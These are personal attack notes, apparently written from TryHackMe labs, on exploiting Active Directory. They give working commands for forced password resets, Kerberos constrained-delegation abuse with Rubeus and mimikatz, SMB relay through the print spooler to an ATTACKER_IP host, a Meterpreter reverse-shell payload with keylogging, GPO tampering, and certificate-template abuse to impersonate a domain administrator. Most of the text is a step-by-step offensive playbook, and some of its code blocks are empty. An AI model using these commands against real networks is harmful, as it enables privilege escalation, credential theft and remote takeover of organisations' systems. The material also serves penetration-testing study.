#### Using Sharphound
First, load the data into bloodhound. 
Then, make a pathway from your current user/group to a target, to see any opportunities

#### Permission delegation / Access Control Entries
In Bloodhound, you can see the lines of permission (see [Active Directory exploitation#Using Sharphound](Using sharphound))
- ForceChangePassword: Force a password change to a password you set
```
$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force
Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password
```
- AddMembers: Add users or groups (including your own) to a target group
```

```
- GenericAll: Complete control (force change password, add to group etc)
```

```
- GenericWrite: update any non-protected parameters of the object (script path etc)
- WriteOwner: Update ownership of the object (set yourself as owner then change password)
- WriteDACL: Write other ACEs to the object (the ACE to change password)
- AllExtendedRights: Do any AD action (force change password)


#### Kerberos delegation
##### Unconstrained delegation
See [[Golden ticket]]
##### Constrained delegation
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation
First, check for constrained delegation:
```
Import-Module PowerView.ps1 
Get-NetUser -TrustedToAuth    // lists all constrained delegation
```

```
# Ask and inject the ticket
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt /outfile:ticket.kirbi

.\Rubeus.exe s4u /ticket:tryhackme.kirbi /impersonateuser:t1_trevor.jones /msdsspn:http/THMSERVER1.za.tryhackme.loc 
.\Rubeus.exe s4u /ticket:tryhackme.kirbi /impersonateuser:t1_trevor.jones /msdsspn:wsman/THMSERVER1.za.tryhackme.loc 
// Make sure to base64-decode if no outfile is used

mimikatz # kerberos::ptt wsman_kirbi       
mimikatz # kerberos::ptt http_kirbi  

New-PSSession -ComputerName thmserver1.za.tryhackme.loc                                                                                                                                                       
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
// You should be in the new shell here
```
Example:
```
mimikatz # kerberos::ptt wsman_kirbi
* File: 'wsman_kirbi': OK 
* mimikatz # kerberos::ptt http_kirbi
* File: 'http_kirbi': OK
mimikatz # exit
Bye!
PS C:\Users\t2_melanie.davies\Desktop>  New-PSSession -ComputerName thmserver1.za.tryhackme.loc
Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
-- ----            ------------    ------------    -----         -----------------     ------------
1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available
PS C:\Users\t2_melanie.davies\Desktop> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc                                                                                                                                                      [thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> whoami                                                                                                                                                                          za\t1_trevor.jones                                                                                                                                                                                                                                    [thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents>      
```

#### SMB Relay exploit (print spooler service)

Requirements:
- A valid set of AD account credentials. (on a compromised AD host)
- Network connectivity to the target's SMB service.
- The target host must be running the Print Spooler service.
- The hosts must not have SMB signing enforced.

To check whether the Print Spooler is running:
```
GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc  // cmd, usually gives an "access denied" error
Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc // Powershell
```
To check SMB Signing:
```
nmap --script=smb2-security-mode -p445 TARGET_IP
```

To exploit:
##### Important: this attack is unstable and might crash the spooler server, requiring a machine reboot 
```
ntlmrelayx.py -smb2support -t smb://TARGET_IP -debug        // Attacker-side, make sure to actually enter the IP and not the hostname
SpoolSample.exe THMSERVER2.za.tryhackme.loc ATTACKER_IP
```

#### Meterpreter keylogging
Requirements: a working reverse shell
to create:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP_ADDRESS LPORT=PORT -f psh -o shell.ps1
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST IP_ADDRESS; set LPORT PORT; exploit"
```
To switch to the target user:
```
ps   // on meterpreter
```
Look for the target user, and use `migrate` to the PID.
Keylogging and dumping:
```
keyscan_start
keyscan_dump
```

#### Exploiting GPOs
A GPO is a ruleset for affected users on an AD network.
For some general exploitation, check [[Active Directory hardening#GPOs (Group Policy Objects)]], see if any of these are enforced and set them to a more vulnerable state.
##### Adding a group to Remote management and administration
First, check in Bloodhound if you have write access (e.g.:`GenericWrite`) to the system. (The Bloodhound symbol is three purple dots with three purple lines besides the dots)
Then, spawn a `cmd` shell as that user from a compromised host:
```
runas /netonly /user:DOMAIN_NAME\AD_USERNAME cmd.exe
```
To make sure to have write access, use:
```
dir \\DOMAIN_NAME\sysvol
```
If the credentials are incorrect, retry the `runas` command.

Then, spawn the Microsoft Management Console:
```
mmc
```
And add the Group Policy snap-in:
1. Click **File** -> **Add/Remove Snap-in**
2. Select the **Group Policy Management** (If there are multiple, use the top Group Policy Management) snap-in and click **Add** 
3. Click **Ok**
If this does not work, make sure the previous steps work.
Then, add a group of your already-compromised users to the restricted groups to configure special access:
1. Expand **Computer Configuration**
2. Expand **Policies**
3. Expand **Windows Settings**
4. Expand **Security Settings**
5. Right Click on **Restricted Groups** and select **Add Group**
6. Click **Browse,** enter **TARGET_GROUP** and click **Check Names**
7. Click **Okay** twice
Then, add the `Administrator`, and the `Remote Desktop Users` to the bottom filter.
Now, you should be able log in to the user on the target computer after 15 minutes or such. (the default SYSVOL policy replication period) 


#### AD Certificate Services exploitation
https://tryhackme.com/room/adcertificatetemplates
```
certipy find -u USERNAME -p PASSWORD -dc-ip DC_IP -vulnerable
```

When finding a vulnerable certificate template with these parameters:
- **Client Authentication** - The certificate can be used for Client Authentication.
- **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** - The certificate template allows us to specify the Subject Alternative Name (SAN).
- **CTPRIVATEKEY_FLAG_EXPORTABLE_KEY** - The certificate will be exportable with the private key.
- **Certificate Permissions** - We have the required permissions to use the certificate template.

Generate the certificate:
1. Click **Start**->**run**
2. Type **mmc** and hit enter
3. Click **File**->**Add/Remove Snap-in..**
4. Add the **Certificates** snap-in and make sure to select **Computer Account** and **Local computer** on the prompts.
5. Click **OK**

We will request a personal certificate:
1. Right Click on **Personal** and select **All Tasks**->**Request New Certificate...**
2. Click **Next** twice to select the AD enrollment policy.
3. You will see that we have one template that we can request, but first, we need to provide additional information.
4. Click on the **More Information** warning.
5. Change the **Subject name Type** option to **Common Name** and provide any value, since it does not matter, and click **Add**.
6. Change the **Alternative name Type** option to **User principal name**.
7. Supply the UPN of the user you want to impersonate. Usually, you'll want a DA account like `Administrator@DOMAIN_NAME`, and click **Add.**

The last step is to export our certificate with the private key:
1. Right-click on the certificate and select **All Tasks**->**Export...**
2. Click **Next**, select **Yes, export the private key**, and click **Next**.
3. Click **Next**, then set a password for the certificate since the private key cannot be exported without a password.
4. Click **Next** and select a location to store the certificate.
5. Click **Next** and finally click **Finish.**

##### User Impersonation through a Certificate
First, use Rubeus to generate a TGT:
```
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:CERT_FILE_NAME.pfx /outfile:OUTPUT_FILE.kirbi /domain:DOMAIN_HOSTNAME /dc:DC_IP
```
Then, use Mimikatz to load the TGT, giving permission to the target:
```
mimikatz.exe
privilege::debug
kerberos::ptt RUBEUS_TICKET.kirbki
exit
```
To test the access, try to read a directory of the impersonated user:
```
dir \\DOMAIN_POSITION_OF_TARGET\c$\
```
